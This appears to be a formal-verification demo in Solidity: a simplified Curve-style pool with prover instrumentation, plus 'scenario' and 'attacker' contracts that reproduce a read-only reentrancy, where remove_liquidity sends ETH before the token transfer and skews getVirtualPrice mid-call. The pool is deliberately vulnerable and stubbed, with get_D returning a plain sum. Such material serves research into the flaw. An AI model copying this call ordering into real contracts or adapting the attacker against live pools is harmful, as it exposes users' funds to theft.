// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;
import "./ERC20.sol";
import "./ReentrancyGuard.sol";
import "./CurveToken.sol";
import "./CurveTokenExample.sol";

contract MintableToken is ERC20 {

    constructor (string memory name, string memory sym) ERC20(name, sym) {

    }

    function mint(address _user, uint _amount) public {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003c0000, 1037618708540) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003c0001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003c0003, 5) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003c6001, _amount) }
        _mint(_user, _amount);
    }
}


contract curve is ReentrancyGuard{
    //Munge
    bytes4 public solghost_executeFunction1;
    bytes4 public solghost_executeFunction2;
    uint256 public solghost_return_func1;
    bool solghost_trigger_check;
    // SOLIDITY GHOST Functions
    function func1_caller() public returns(uint256)
    {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00420000, 1037618708546) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00420001, 0) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00420002, 0) }
        return getVirtualPrice();
    }

    function sample_view_functions() internal{assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003e0000, 1037618708542) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003e0001, 0) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003e0002, 0) }
        // Sample the values
        solghost_return_func1 = getVirtualPrice();
        // Trigger the check in CVL
        solghost_trigger_check = true;
    }

    //uint128 public constant  2 = 2;
    uint256  constant A_PRECISION =100;
    uint256  constant PRECISION = 10e18;
    uint256  future_A_time;
    uint256  future_A;
    uint256  initial_A_time;
    uint256  initial_A;
    uint256[2]  admin_balances;
    // storage var "address[2] coins" was seperated to be able to link
    address public coins_0;
    address public coins_1;
    address  public lp_token;
    address  owner;
    // address  public underlying_token; // would be linked to ERC20 and equal to coins[1], but can't do directly due to CVL limitations
    uint256  kill_deadline;
    uint256  fee;
    uint256  admin_fee;
    uint256  future_fee;
    uint256  future_owner;
    uint256  future_admin_fee;
    uint256  _DEMO_D;

    mapping(uint256 => mapping(uint256 => mapping(uint256 => uint256))) _DEMO_D_MAPPING;



    
    // constructor(uint256 _future_A_time, uint256 _future_A, uint256 _initial_A_time, uint256 _initial_A, address owner ) {

    constructor(address _lp_token, address _token_addr) payable {
        lp_token = _lp_token;
        coins_1 = _token_addr;
    }


    // function get_D(uint xp_0, uint xp_1)

    function get_D(uint256[2] memory xp,uint256 amp) public view returns(uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00410000, 1037618708545) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00410001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00410003, 5) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00416001, amp) }
        uint256 S = 0;
        uint256 Dprev = 0;
        // Demo simplificaiton - unconstrained CONST
        // get_D currently crashes the prover's pre-SMT analysis or something
        // uint256 x; 
        // return _DEMO_D; 
        // return _DEMO_D_MAPPING[xp[0]][xp[1]][amp];
        return xp[0] + xp[1];
        // Simplification end

        for (uint256 _x=0;_x<xp.length;_x++){
            S +=xp[_x];
        }
        if(S == 0){
            return 0;
        }

        uint256 D=S;
        uint256 Ann = amp * 2;
        for (uint _i=0;_i<255;++_i){
            uint256 D_P = D;
            for (uint256 _x=0;_x<xp.length;_x++){
                D_P = D_P * D / (xp[_x] * 2 +1);
            }
            Dprev = D;
            D = (Ann * S / A_PRECISION + D_P * 2) * D / ((Ann - A_PRECISION) * D / A_PRECISION + (2 + 1) * D_P);
            if (D > Dprev){
                if (D - Dprev <= 1){
                    return D;
                }
            }
            else{
                if (Dprev - D <= 1){
                    return D;
                }
            }
        }
        revert();
    }

    function _A() view internal returns(uint256) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003f0000, 1037618708543) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003f0001, 0) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003f0002, 0) }
        
        // Demo simplificaiton - return unconstrained CONST
        return future_A;
        // Simplification end

        uint256 t1 = future_A_time;
        uint256 A1 = future_A;
        if (block.timestamp < t1){
            uint256 A0 = initial_A;
            uint256 t0 = initial_A_time;
            if (A1 > A0){
                return A0 + (A1 - A0) * (block.timestamp - t0) / (t1 - t0);
            }
            else{
                return A0 - (A0 - A1) * (block.timestamp - t0) / (t1 - t0);
            }
        }
        else{
            return A1;
        }
    }
    
    function _balances(uint256 _value) public view returns(uint256[2] memory) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00400000, 1037618708544) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00400001, 1) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00400003, 1) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00406000, _value) }
        return [
            address(this).balance - admin_balances[0] - _value,
            ERC20(coins_1).balanceOf(address(this)) - admin_balances[1]];
    }

    function getVirtualPrice() public view returns(uint256){assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00430000, 1037618708547) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00430001, 0) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00430002, 0) }
        uint256 D = this.get_D(_balances(0),_A());
        uint256 totalShares = ERC20(lp_token).totalSupply();
        return D * PRECISION / totalShares;
    }
    
    function remove_liquidity(
        uint256 _amount,
        uint256[2] memory _min_amounts
        )
        logInternal68(_min_amounts)nonReentrant 
        public 
        returns(uint256[2] memory) 
    {
        uint256[2] memory amounts = _balances(0);
        uint256 total_supply = ERC20(lp_token).totalSupply();
        CurveToken(lp_token).burnFrom(msg.sender, _amount);
        for (uint256 i;i<2;i++){
            uint256 value = amounts[i] * _amount / total_supply;
            assert (value >= _min_amounts[i]);
            amounts[i] = value;
            if (i == 0){
                msg.sender.call{value:value}("");
                sample_view_functions();

            }
            else{
                assert (ERC20(coins_1).transfer(msg.sender, value));
            }
        }
        return amounts;
    }modifier logInternal68(uint256[2] memory _min_amounts) { assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00440000, 1037618708548) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00440001, 2) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00440003, 5) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00446001, _min_amounts) } _; }

}


contract scenario {

    uint constant other_user_lp = 40e18;
    uint constant underlying_asset_before = 80e18;
    uint constant deposited_ether_before = 4e18;
    uint constant attacker_lp = 40e18;
    uint constant attacker_underlying = 80e18;
    uint constant attacker_deposit_eth = 4e18; 
    address constant other_user = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;

    function init_scenario(/*address other_user*/) payable public returns(address) {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00450000, 1037618708549) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00450001, 0) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff00450002, 0) }
        CurveTokenExample lp_token = new CurveTokenExample(); 
        MintableToken token = new MintableToken("example", "ex");

        // setup curve contract and its ETH and shares BEFORE the attacker
        require(msg.value >= deposited_ether_before + attacker_deposit_eth, "Not enough funds sent to init the scenario");
        curve _curve = new curve{value: deposited_ether_before}(address(lp_token), address(token));
        lp_token.mint(other_user, other_user_lp);
        token.mint(address(_curve), underlying_asset_before);

        // Log the price before the attacker
        // console.log("before the attacker got in the price is %s", _curve.getVirtualPrice());

        // attakcer contract
        attacker _attContract = new attacker(address(_curve));

        // setup state (mints)
        // _curve.addScenarioEther{value: attacker_deposit_eth}();
        lp_token.mint(address(_attContract), attacker_lp);
        token.mint(address(_curve), attacker_underlying);

        
        // Run the exploit
        _attContract.exec();

        return address(_attContract);
    }
}

contract attacker{
    curve public attacked;
    ERC20 token;
    CurveTokenExample lp_token;

    constructor(address attackedAddr){
        attacked = curve(attackedAddr);
        token = ERC20(attacked.coins_1());
        lp_token = CurveTokenExample(attacked.lp_token());
    }
    function exec() public {assembly { mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003d0000, 1037618708541) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003d0001, 0) mstore(0xffffff6e4604afefe123321beef1b01fffffffffffffffffffffffff003d0002, 0) }
    // prepare token
        // console.log("After Attacker deposit price is %s",attacked.getVirtualPrice());
        uint256 my_lp_balance = lp_token.balanceOf(address(this));
        uint[2] memory zeros = [uint(0), 0];
        // console.log("trying to remove liq....");
        attacked.remove_liquidity(my_lp_balance, zeros);    // virtual price dropped
        // console.log("after the attack price is %s",attacked.getVirtualPrice());
    }
    fallback() external payable {
        // console.log("during the attack price is %s",attacked.getVirtualPrice());
    }
}